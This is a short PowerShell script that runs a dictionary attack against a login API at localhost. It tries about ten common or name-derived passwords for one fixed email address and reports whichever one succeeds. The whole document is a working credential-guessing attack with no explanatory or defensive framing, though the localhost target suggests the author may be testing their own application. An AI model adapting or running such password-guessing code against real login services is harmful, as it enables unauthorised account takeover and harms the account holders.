$email = "ku@gmail.com"
$passwords = @("12345","123456","test","password","admin","1234","ku123","ku@123","abcde","ku")

foreach ($pw in $passwords) {
    $body = "{`"customer_email`":`"$email`",`"customer_password`":`"$pw`"}"
    try {
        $r = Invoke-RestMethod -Uri 'http://localhost:3000/api/login' -Method POST -ContentType 'application/json' -Body $body
        Write-Host "✅ PASSWORD FOUND: [$pw]  Name: $($r.customer_name)"
        break
    } catch {
        Write-Host "❌ Wrong: [$pw]"
    }
}
